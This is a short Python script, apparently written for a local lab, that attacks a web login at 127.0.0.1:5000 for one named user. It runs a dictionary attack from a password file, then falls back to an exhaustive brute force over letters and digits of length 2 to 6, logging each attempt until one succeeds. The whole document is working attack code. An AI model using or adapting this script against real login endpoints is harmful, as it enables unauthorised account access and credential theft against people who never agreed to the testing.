import requests
import itertools
import string

url = 'http://127.0.0.1:5000/login'

def attempt_login(username, password):
    data = {'username': username, 'password': password}
    response = requests.post(url, data=data)
    print(f"Attempted login with Username: {username}, Password: {password}, Content: {response.content}")
    if response.status_code == 200:
        if response.json().get('success'):
            print(f"Success! Username: {username}, Password: {password}")
            return True
    
    return False

username = "yangLi"
success = False  # Flag to indicate if the login was successful
# password = '100'

# Load the dictionary of passwords
password_file_path = './dictionary.txt'
with open(password_file_path, 'r') as file:
    passwords = file.read().splitlines()

# Attempt to login using each password from the dictionary
for password in passwords:
    if attempt_login(username, password):
        success = True
        break

if not success:
    # Now let's attempt a brute force attack with a combination of digits and letters
    print("None of the passwords in dictionary.txt matches")
    characters = string.ascii_letters + string.digits  # Combining letters and digits
    for password_length in range(2, 7):  # Adjust the range as needed
        if success:
            break
        for password in itertools.product(characters, repeat=password_length):
            password_str = ''.join(password)
            if attempt_login(username, password_str):
                success = True
                break 
            
